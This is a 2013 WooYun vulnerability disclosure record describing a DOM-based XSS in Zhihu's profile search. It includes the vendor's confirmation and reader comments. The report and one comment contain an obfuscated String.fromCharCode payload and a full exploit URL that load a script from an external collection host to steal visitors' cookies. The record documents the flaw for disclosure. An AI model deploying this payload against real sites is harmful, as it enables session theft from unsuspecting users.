{"id": 12618, "wybug_id": "wooyun-2013-021587", "wybug_title": "知乎某处domxss，可以获取用户cookie(含利用过程)", "wybug_corp": "知乎", "wybug_author": "梧桐雨", "wybug_date": "2013-04-11 13:56", "wybug_open_date": "2013-05-26 13:57", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "类型应用", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-05-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-26：\t细节向公众公开  简要描述： 天亮了，收cookie。 详细说明：  首先获取cookie真的得感谢二哥@gainover的传授随手看了下乌云的厂商，碰到了知乎，偶然的一次机遇，发现了一次domxss。这也是我接触的第一次domxss当然，不是随便发现，也是得看看输出。知乎这个厂商所出的漏洞都是xss，但这个domxss实在特别了点。在个人资料处，我又看到了搜索框，手贱就去测试了一下:\n<script>alert(1)</script>、<img src=\"http://www.baidu.com/img/shouye_b5486898c692066bd2cbaeda86d74448.gif\" onmouseover=alert(1) />\n 都没有弹出当输入<img src=1 onerror=alert(1) />惊喜来了。成功插入：\n\n之后再找了一下出问题的输出点，最后确定是在：\n\n因为是第一次遇到domxss，之前玩xss都是反射的，这下糟了，该如何引入呢？最后跑去问二哥~二哥拿出他的:http://app.baidu.com/app/enter?appid=280383xss安全测试工具。(顺便推荐一下，真的很不错，初学xss很有利用价值)里面有一条调用外部文件，代码生成 img onerror调用。\n\n因为在测试的时候发现过滤了\"，因此就用了无引号的版本。最终形成的domxss获取cookie的代码：\n<img/src=1 onerror=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,46,101,122,115,101,99,46,111,114,103,47,63,117,61,99,97,101,100,57,99);document.body.appendChild(window.s)})()>\n   漏洞证明：  最后利用只需要把\n<img/src=1 onerror=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,120,115,115,46,101,122,115,101,99,46,111,114,103,47,63,117,61,99,97,101,100,57,99);document.body.appendChild(window.s)})()>\n输入到输入框，最后拼接出利用的连接：\nhttp://www.zhihu.com/people/tongy-wu/search?pq=%3Cimg%2Fsrc%3D1%20onerror%3D(function()%7Bwindow.s%3Ddocument.createElement(String.fromCharCode(115%2C99%2C114%2C105%2C112%2C116))%3Bwindow.s.src%3DString.fromCharCode(104%2C116%2C116%2C112%2C58%2C47%2C47%2C120%2C115%2C115%2C46%2C101%2C122%2C115%2C101%2C99%2C46%2C111%2C114%2C103%2C47%2C63%2C117%2C61%2C99%2C97%2C101%2C100%2C57%2C99)%3Bdocument.body.appendChild(window.s)%7D)()%3E&type=all\ncookie就获取到了\n\n\n\n利用过程也很简单，只需要将url地址发布到知乎上面就可以了。   修复方案：  对输出的点进行处理。代码在大约935行。   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-04-11 16:45 厂商回复： 谢谢反馈，我们立刻修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-14 12:26 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  漏洞关联： WooYun: [腾讯实例教程] 那些年我们一起学XSS - 8. Dom Xss入门 [显式输出]    \n     2013-05-01 17:41 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  ...这、、、一个反射型给15rank？？标题中的利用过程在哪里？？表示么看懂、、、    \n     2013-05-26 15:00 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  @px1624 看过程    \n     2013-05-26 19:18 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @xsser 过程看了啊，最想看的那个标题中说的利用过程，结果发现就一句话。。“利用过程也很简单，只需要将url地址发布到知乎上面就可以了。”    \n     2013-08-12 17:23 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  @px1624 输入到输入框，最后拼接出利用的连接：http://www.zhihu.com/people/tongy-wu/search?pq=%3Cimg%2Fsrc%3D1%20onerror%3D(function()%7Bwindow.s%3Ddocument.createElement(String.fromCharCode(115%2C99%2C114%2C105%2C112%2C116))%3Bwindow.s.src%3DString.fromCharCode(104%2C116%2C116%2C112%2C58%2C47%2C47%2C120%2C115%2C115%2C46%2C101%2C122%2C115%2C101%2C99%2C46%2C111%2C114%2C103%2C47%2C63%2C117%2C61%2C99%2C97%2C101%2C100%2C57%2C99)%3Bdocument.body.appendChild(window.s)%7D)()%3E&type=all  这个和上面几句才是利用过程    \n     2013-10-02 17:24 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n  不错  同知乎用户    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}